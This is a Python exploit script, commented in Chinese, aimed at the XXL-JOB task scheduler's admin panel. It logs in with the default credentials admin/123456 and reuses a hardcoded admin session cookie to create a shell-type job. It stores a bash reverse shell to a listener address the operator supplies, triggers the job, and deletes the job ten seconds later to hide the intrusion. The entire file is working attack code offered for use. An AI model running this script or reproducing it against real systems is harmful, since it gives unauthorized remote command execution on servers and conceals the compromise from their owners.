import re,argparse
import time
import requests,urllib3,base64

parser = argparse.ArgumentParser(description='This is the help!')
parser.add_argument('-t', '--target', help='\t要检测的url', default='')
parser.add_argument('-l', '--local', help='\t自己监听的服务器IP:port', default='')
args = parser.parse_args()
urllib3.disable_warnings()

# 添加用户
def reqxxl_job(url):
    data = "dXNlck5hbWU9YWRtaW4mcGFzc3dvcmQ9MTIzNDU2"
    header = {
        "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
        "Accept": "*/*",
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    }
    print("="*80)
    try:
        response = requests.post(url+"/login",verify=False,data=base64.b64decode(data).decode(),headers=header,allow_redirects=False,timeout=5)
        if response.json()['code'] == 200:
            # print(response.json())
            print("网站存在弱口令 ： admin / 123456")
        else:
            print("弱口令不存在")
    except:
        print("Error")


# 添加执行器 获取返回ID
def writezx(url):
    data = "jobGroup=11&jobDesc=aaa&author=aaa&alarmEmail=aaa&jobCron=*+*+*+*+*+%3F&scheduleType=CRON&scheduleConf=*+*+*+*+*+%3F&cronGen_display=*+*+*+*+*+%3F&schedule_conf_CRON=*+*+*+*+*+%3F&schedule_conf_FIX_RATE=&schedule_conf_FIX_DELAY=&glueType=GLUE_SHELL&executorHandler=&executorParam=&executorRouteStrategy=FIRST&childJobId=&misfireStrategy=DO_NOTHING&executorBlockStrategy=SERIAL_EXECUTION&executorTimeout=0&executorFailRetryCount=0&glueRemark=GLUE%E4%BB%A3%E7%A0%81%E5%88%9D%E5%A7%8B%E5%8C%96&glueSource=%23!%2Fbin%2Fbash%0D%0Aecho+%22xxl-job%3A+hello+shell%22%0D%0A%0D%0Aecho+%22%E8%84%9A%E6%9C%AC%E4%BD%8D%E7%BD%AE%EF%BC%9A%240%22%0D%0Aecho+%22%E4%BB%BB%E5%8A%A1%E5%8F%82%E6%95%B0%EF%BC%9A%241%22%0D%0Aecho+%22%E5%88%86%E7%89%87%E5%BA%8F%E5%8F%B7+%3D+%242%22%0D%0Aecho+%22%E5%88%86%E7%89%87%E6%80%BB%E6%95%B0+%3D+%243%22%0D%0A%0D%0Aecho+%22Good+bye!%22%0D%0Aexit+0%0D%0A"
    header = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
        "Accept": "*/*",
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': f'{url}/jobinfo?jobGroup=2',
        'Cookie': 'XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d'
    }
    try:
        response = requests.post(url + "/jobinfo/add", verify=False, data=data, headers=header,
                                 allow_redirects=False, timeout=5)
        print('子任务ID:'+response.json()["content"])
    except:
        response = {"content":"执行器错误 可修改data段中的第一个参数再次尝试 jobGroup=1&..... "}

    return response.json()["content"]


# 添加需要 反弹shell的地址
def writecmd(url,lists,localip):
    data = f"id={lists}&glueSource=%23!%2Fbin%2Fbash%0Aexec+5%3C%3E%2Fdev%2Ftcp%2F{localip}%3Bcat+%3C%265+%7C+while+read+line%3B+do+%24line+2%3E%265+%3E%265%3B+done&glueRemark=aaaa"
    header = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
        "Accept": "*/*",
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': 'XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d'
    }
    try:
        response = requests.post(url + "/jobcode/save", verify=False, data=data, headers=header,
                                 allow_redirects=False, timeout=5)
        if response.json()["code"] == 200:
            print("反弹shell命令保存成功！")
    except:print("执行器错误 可修改data段中的第一个参数再次尝试 jobGroup=1&.....")

# 执行 创建renwuid
def zhixingrenwu(url,lists):
    data = f"id={lists}&executorParam=0&addressList="
    header = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
        "Accept": "*/*",
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': 'XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d'
    }
    try:
        response = requests.post(url + "/jobinfo/trigger", verify=False, data=data, headers=header,
                                 allow_redirects=False, timeout=5)
        if response.json()["code"] == 200:
            print("命令执行成功 请查看是否连接成功！")
            print("十秒后删除执行器~~")
    except:
        print("漏洞利用失败")
# 执行命令反弹shell
def shanchuzhixingqi(url,lists):
    data = f"id={lists}"
    header = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
        "Accept": "*/*",
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': 'XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d'
    }
    try:
        response = requests.post(url + "/jobinfo/remove", verify=False, data=data, headers=header,
                                 allow_redirects=False, timeout=5)
        if response.json()["code"] == 200:
            print("执行器已删除~~~")
    except:
        print("删除失败!!")
#删除管理员账户 （询问是否删除w）

if __name__ == '__main__':
    list = []
    if args.local == "":
        print("="*80)
        print("未输入监听地址 请输入-h 查看参数~")
        print("退出程序~")
        quit()
    else:
        if args.target == '':
            print("请输入url 或 -h 查看帮助信息")
        else:
            reqxxl_job(args.target)
            try:
                list.append(writezx(args.target))
            except:
                print("如果出现弱口令 执行器错误 可修改writezx() 函数中data段中的第一个参数再次尝试 jobGroup=1&.....")
                quit()
            writecmd(args.target,list[0],args.local.replace(":","/"))
            zhixingrenwu(args.target,list[0])
            time.sleep(10)
            shanchuzhixingqi(args.target,list[0])




